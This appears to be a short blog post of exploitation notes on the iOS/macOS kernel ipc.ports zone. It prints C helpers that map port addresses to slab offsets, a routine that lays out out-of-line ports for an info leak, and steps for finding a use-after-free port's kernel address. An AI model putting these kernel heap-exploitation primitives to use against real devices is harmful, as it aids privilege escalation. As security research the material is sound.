---
layout: post
title:  "About ipc.ports zone"
date:   2018-08-20
categories: ios macos exploitation
---

# Basics
* The size of `struct ipc_port` is 168. 
* The size of kalloc is 4096 * (3 or 4).

# No offset collision
There is no offset collision in one kalloc(not checked by code yet), so if you can get the offset of a `ipc_port`, you can get the port index and page index.

```c
// 0xA8
uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
{
    static uint32_t page0[25] = {
        0x000, 0x0A8, 0x150, 0x1F8, 0x2A0, 0x348, 0x3F0, 0x498, 0x540, 0x5E8,
        0x690, 0x738, 0x7E0, 0x888, 0x930, 0x9D8, 0xA80, 0xB28, 0xBD0, 0xC78,
        0xD20, 0xDC8, 0xE70, 0xF18, 0xFC0
    };
    
    static uint32_t page1[25] = {
        0x068, 0x110, 0x1B8, 0x260, 0x308, 0x3B0, 0x458, 0x500, 0x5A8, 0x650,
        0x6F8, 0x7A0, 0x848, 0x8F0, 0x998, 0xA40, 0xAE8, 0xB90, 0xC38, 0xCE0,
        0xD88, 0xE30, 0xED8, 0xF80, 0xFFF
    };
    
    static uint32_t page2[25] = {
        0x028, 0x0D0, 0x178, 0x220, 0x2C8, 0x370, 0x418, 0x4C0, 0x568, 0x610,
        0x6B8, 0x760, 0x808, 0x8B0, 0x958, 0xA00, 0xAA8, 0xB50, 0xBF8, 0xCA0,
        0xD48, 0xDF0, 0xE98, 0xF40, 0xFFF
    };
    
    static uint32_t* pages[] = {
        page0, page1, page2
    };
    
    uint32_t offset = kObjAddr & 0xFFF;
    
    int pgCnt = sizeof(pages) / sizeof(uint32_t *);
    int itemCnt = sizeof(page0) / sizeof(uint32_t);
    for (int pgIdx = 0; pgIdx < pgCnt; ++pgIdx) {
        for (int objIdx = 0; objIdx < itemCnt; ++objIdx) {
            if (pages[pgIdx][objIdx] == offset) {
                return ((uint64_t)pgIdx << 32) | objIdx;
            }
        }
    }
    
    return -1;
}


// 0xB8
uint64_t PRTS_GetPageAndElementInfo(uint64_t kObjAddr)
{
    static uint32_t page0[23] = {
        0x000, 0x0B8, 0x170, 0x228, 0x2E0, 0x398, 0x450, 0x508, 0x5C0, 0x678,
        0x730, 0x7E8, 0x8A0, 0x958, 0xA10, 0xAC8, 0xB80, 0xC38, 0xCF0, 0xDA8,
        0xE60, 0xF18, 0xFD0
    };
    
    static uint32_t page1[23] = {
        0x088, 0x140, 0x1F8, 0x2B0, 0x368, 0x420, 0x4D8, 0x590, 0x648, 0x700,
        0x7B8, 0x870, 0x928, 0x9E0, 0xA98, 0xB50, 0xC08, 0xCC0, 0xD78, 0xE30,
        0xEE8, 0xFA0, 0xFFF
    };
    
    static uint32_t page2[23] = {
        0x058, 0x110, 0x1C8, 0x280, 0x338, 0x3F0, 0x4A8, 0x560, 0x618, 0x6D0,
        0x788, 0x840, 0x8F8, 0x9B0, 0xA68, 0xB20, 0xBD8, 0xC90, 0xD48, 0xE00,
        0xEB8, 0xF70, 0xFFF
    };
    
    static uint32_t page3[23] = {
        0x028, 0x0E0, 0x198, 0x250, 0x308, 0x3C0, 0x478, 0x530, 0x5E8, 0x6A0,
        0x758, 0x810, 0x8C8, 0x980, 0xA38, 0xAF0, 0xBA8, 0xC60, 0xD18, 0xDD0,
        0xE88, 0xF40, 0xFFF
    };
    
    static uint32_t *pages[] = {
        page0, page1, page2, page3
    };
    
    uint32_t offset = kObjAddr & 0xFFF;
    
    int pgCnt = sizeof(pages) / sizeof(uint32_t *);
    int itemCnt = sizeof(page0) / sizeof(uint32_t);
    for (int pgIdx = 0; pgIdx < pgCnt; ++pgIdx) {
        for (int objIdx = 0; objIdx < itemCnt; ++objIdx) {
            if (pages[pgIdx][objIdx] == offset) {
                return ((uint64_t)pgIdx << 32) | objIdx;
            }
        }
    }
    
    return -1;
}
```

# Info leak by ool ports
Should pay attention to port layout.

```c
// 0xA8
void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLeakPort)
{
    static const int step = (PRTS_PAGE_SIZE / PRTS_PORT_SIZE) + 1;
    static const int ctxOffset = (PRTS_PORT_CTX_OFFSET / 8);
    
    // page: 1
    for (int idx = 0; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 2
    payloadObjs[10] = infoLeakPort;
    for (int idx = 13; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 3
    payloadObjs[2] = infoLeakPort;
    for (int idx = 5; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
}


// 0xB8
void PRTS_LayoutPorts(mach_port_t *payloadObjs, int portCnt, mach_port_t infoLeakPort)
{
    static const int step = (PRTS_PAGE_SIZE / PRTS_PORT_SIZE) + 1;
    static const int ctxOffset = (PRTS_PORT_CTX_OFFSET / 8);
    
    // page: 1
    for (int idx = 0; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 2
    payloadObjs[14] = infoLeakPort;
    for (int idx = 17; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 3
    payloadObjs[8] = infoLeakPort;
    for (int idx = 11; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
    
    // page: 4
    payloadObjs[2] = infoLeakPort;
    for (int idx = 5; idx < portCnt; idx += step) {
        payloadObjs[idx + ctxOffset] = infoLeakPort;
    }
}
```

# How to get UaF port address
* By filling the gap, you can get 2 kalloc with continuous address.
* Place the UaF port in the 1st kalloc, place the info leak port in the 2nd kalloc.
* With ool ports, you can get the address of info leak port.
* With the address of info leak port, you can call `PRTS_GetPageAndElementInfo`.
* With the info of 2nd kalloc, you can get the address range of 1st kalloc.
* If you can get the offset of UaF port, you can get the info of 1st kalloc.
* With GC, you can control 3 pages.
